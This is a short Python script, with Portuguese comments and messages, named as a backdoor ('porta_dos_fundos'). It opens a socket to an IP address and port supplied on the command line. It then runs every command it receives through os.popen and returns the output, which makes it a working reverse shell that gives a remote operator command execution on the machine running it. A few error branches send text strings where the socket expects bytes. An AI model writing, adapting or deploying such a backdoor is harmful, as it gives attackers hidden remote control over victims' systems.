import os, socket, sys

def usage():
    print('''
    Como usar:
    -----------------------------
    #porta_dos_fundos.py <ip_alvo> <porta>
    -----------------------------
    ''')
    exit()

if len(sys.argv) != 3:
    usage()

s = socket.socket()
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(b'########## Conectado ao Cliente ##########\n')

while True:
    data = s.recv(512).decode("utf-8")
    
    if data.lower() == "q":
        s.close()
        break
    
    if data.startswith('cd'):
        try:
            os.chdir(data[3:].strip())
            s.send(f'Movendo para: {os.getcwd()}\n'.encode())
        except FileNotFoundError:
            s.send(f'Diretório não encontrado\n')
    else:
        result = os.popen(data).read()
        if result:
            s.send(result.encode())
        else:
            s.send(f'Comando não produziu saída\n')
